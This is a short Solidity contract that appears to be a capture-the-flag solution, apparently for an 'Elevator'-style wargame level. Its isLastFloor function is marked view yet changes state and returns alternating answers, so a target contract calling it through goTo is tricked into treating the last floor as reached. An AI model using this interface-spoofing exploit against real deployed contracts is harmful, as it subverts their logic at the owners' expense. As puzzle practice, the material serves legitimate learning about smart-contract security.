pragma solidity ^0.4.18;

contract Building {
    address public owner;
    address public instance;
    uint public count;
    
    constructor(address _contract) public {
        owner = msg.sender;
        instance = _contract;
    }

    function callContract(bytes4 _input, uint _floor) public returns (bool) {
        return address(instance).call.gas(3000000)(_input, _floor);
    }
    
    function isLastFloor(uint) view public returns (bool) {
        count++;
        if (count % 2 == 0) {
            return false;
        }
        return true;
    }

    //goTo(uint256)
    function getKeccak(string _input) public pure returns (bytes4) {
        return bytes4(keccak256(_input));
    }
  
    function kill() public {
        require(owner == msg.sender);
        selfdestruct(owner);
    }
  
}
